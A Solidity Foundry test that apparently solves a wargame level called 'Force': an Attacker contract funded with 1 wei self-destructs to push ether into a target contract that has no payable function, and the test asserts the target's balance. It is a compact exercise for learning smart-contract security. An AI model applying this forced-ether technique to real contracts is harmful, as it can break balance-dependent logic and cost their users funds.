// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./Force.sol";

contract Attacker {
    constructor() payable {}

    function attack(address force) external {
        selfdestruct(payable(force));
    }
}

contract ForceTest is Test {
    Force internal _force;

    function setUp() public {
        _force = new Force();
    }

    function test_attack() public {
        Attacker attacker = new Attacker{value: 1}();

        attacker.attack(address(_force));

        assertGt(address(_force).balance, 0, "force balance");
    }
}